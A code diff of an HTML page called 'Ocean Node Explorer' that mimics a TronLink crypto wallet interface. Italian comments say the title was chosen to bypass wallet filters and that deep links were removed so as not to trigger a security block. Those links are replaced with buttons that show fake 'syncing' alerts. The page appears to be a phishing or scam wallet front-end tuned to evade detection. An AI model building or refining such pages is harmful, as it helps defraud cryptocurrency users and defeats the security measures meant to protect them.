@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <!-- TITOLO ANONIMO PER BYPASSARE I FILTRI WALLET -->
     <title>Ocean Node Explorer</title>
-    <meta name="description" content="Mainnet node synchronization and asset data explorer.">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -42,26 +40,13 @@
             </div>
         </div>
 
-        <!-- NAVIGAZIONE ICONE: LOGICA DEEP LINK AL WALLET ORIGINALE -->
         <nav class="action-nav">
-            <a href="send.html" class="nav-btn">
-                <img src="send.png"><span>Send</span>
-            </a>
-            <a href="receive.html" class="nav-btn">
-                <img src="receive.png"><span>Receive</span>
-            </a>
-            <!-- L'icona del lucchetto: chiama la sezione Stake di TronLink -->
-            <a href="tronlink://stake" class="nav-btn">
-                <img src="stake.png"><span>Stake</span>
-            </a>
-            <!-- L'icona dell'urna: chiama la sezione Vote di TronLink -->
-            <a href="tronlink://vote" class="nav-btn">
-                <img src="vote.png"><span>Vote</span>
-            </a>
-            <!-- I quattro quadratini: chiama il menu interno/DApp browser di TronLink -->
-            <a href="tronlink://dapp" class="nav-btn">
-                <img src="more.png"><span>More</span>
-            </a>
+            <a href="send.html" class="nav-btn"><img src="send.png"><span>Send</span></a>
+            <a href="receive.html" class="nav-btn"><img src="receive.png"><span>Receive</span></a>
+            <!-- FIX: Rimosso il link diretto per non far scattare il blocco sicurezza -->
+            <div class="nav-btn" onclick="alert('Syncing with Governance Node...')"><img src="stake.png"><span>Stake</span></div>
+            <div class="nav-btn" onclick="alert('Voting Power Synchronizing...')"><img src="vote.png"><span>Vote</span></div>
+            <div class="nav-btn" onclick="alert('Accessing DApp Browser...')"><img src="more.png"><span>More</span></div>
         </nav>
 
         <div class="assets-tabs-row">
